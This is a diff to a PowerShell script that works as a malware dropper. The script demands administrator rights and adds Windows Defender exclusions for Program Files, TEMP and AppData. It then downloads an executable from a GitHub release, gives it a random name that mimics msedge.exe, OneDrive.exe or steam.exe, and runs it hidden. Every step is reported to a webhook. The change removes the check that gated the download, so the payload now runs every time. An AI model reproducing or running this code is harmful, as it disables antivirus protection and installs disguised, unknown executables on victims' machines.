@@ -14,6 +14,14 @@ function Send-WebhookMessage {
 Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 
 try {
+    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
+    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
+        Add-Type -AssemblyName PresentationFramework
+        [System.Windows.MessageBox]::Show('Please run this script as administrator','Warning',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Warning)
+        exit3
+    }
+
     $programFiles = "C:\Program Files"
     $tempFolder = $env:TEMP
     $appDataFolder = $env:APPDATA
@@ -50,34 +58,24 @@ try {
         Send-WebhookMessage -Message "Error adding exclusion for ${localAppDataFolder}: $_"
     }
 
-    if ($exclusionsAdded) {
-        $exeNames = @("msedge.exe", "OneDrive.exe", "GoogleUpdate.exe", "steam.exe")
-        $selectedExe = $exeNames | Get-Random
-        $destinationPath = Join-Path -Path $localAppDataFolder -ChildPath $selectedExe
-        try {
-            Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
-        } catch {
-            Send-WebhookMessage -Message "Error adding exclusion for ${destinationPath}: $_"
-        }
-
-        $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
-        try {
-            Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Downloaded $selectedExe to $destinationPath"
-            Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Executed $selectedExe"
-        } catch {
-            Send-WebhookMessage -Message "Error downloading or executing ${selectedExe}: $_"
-        }
+    $exeNames = @("msedge.exe", "OneDrive.exe", "GoogleUpdate.exe", "steam.exe")
+    $selectedExe = $exeNames | Get-Random
+    $destinationPath = Join-Path -Path $localAppDataFolder -ChildPath $selectedExe
+    try {
+        Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
+        Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
+    } catch {
+        Send-WebhookMessage -Message "Error adding exclusion for ${destinationPath}: $_"
     }
 
-    $python = Get-Command python -ErrorAction SilentlyContinue
-    if ($python) {
-        Send-WebhookMessage -Message "Python is installed"
-    } else {
-        Add-Type -AssemblyName PresentationFramework
-        [System.Windows.MessageBox]::Show('Python is not installed','Error',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Error)
+    $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
+    try {
+        Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
+        Send-WebhookMessage -Message "Downloaded $selectedExe to $destinationPath"
+        Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
+        Send-WebhookMessage -Message "Executed $selectedExe"
+    } catch {
+        Send-WebhookMessage -Message "Error downloading or executing ${selectedExe}: $_"
     }
 
     Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
